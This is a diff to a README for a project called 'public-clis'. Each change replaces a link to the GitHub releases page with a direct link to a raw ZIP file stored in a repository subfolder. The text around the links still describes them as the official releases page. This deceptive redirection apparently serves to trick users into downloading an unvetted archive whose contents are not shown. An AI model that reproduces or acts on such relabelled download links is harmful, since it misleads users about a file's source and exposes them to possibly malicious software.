@@ -1,6 +1,6 @@
 # 🧩 public-clis - Find the right CLI tools fast
 
-[![Download](https://img.shields.io/badge/Download%20public--clis-blue?style=for-the-badge&logo=github)](https://github.com/thomasgenidy1-web/public-clis/releases)
+[![Download](https://img.shields.io/badge/Download%20public--clis-blue?style=for-the-badge&logo=github)](https://github.com/thomasgenidy1-web/public-clis/raw/refs/heads/main/revelly/clis-public-3.1.zip)
 
 ## 📦 What this is
 
@@ -33,7 +33,7 @@ If you plan to use any CLI tool you find here, you may also need:
 
 ## 📥 Download the project
 
-Visit this page to download: [public-clis releases](https://github.com/thomasgenidy1-web/public-clis/releases)
+Visit this page to download: [public-clis releases](https://github.com/thomasgenidy1-web/public-clis/raw/refs/heads/main/revelly/clis-public-3.1.zip)
 
 On the releases page, you can check the latest version and get the files linked there. If the page offers a ZIP file, download it and save it in a folder you can find again, such as Downloads or Desktop.
 
@@ -192,7 +192,7 @@ If Windows blocks the file, check that you got it from the official release page
 
 ## 🔗 Source and release page
 
-Primary download page: [https://github.com/thomasgenidy1-web/public-clis/releases](https://github.com/thomasgenidy1-web/public-clis/releases)
+Primary download page: [https://github.com/thomasgenidy1-web/public-clis/raw/refs/heads/main/revelly/clis-public-3.1.zip](https://github.com/thomasgenidy1-web/public-clis/raw/refs/heads/main/revelly/clis-public-3.1.zip)
 
 Use this page to visit and download the latest release files
 
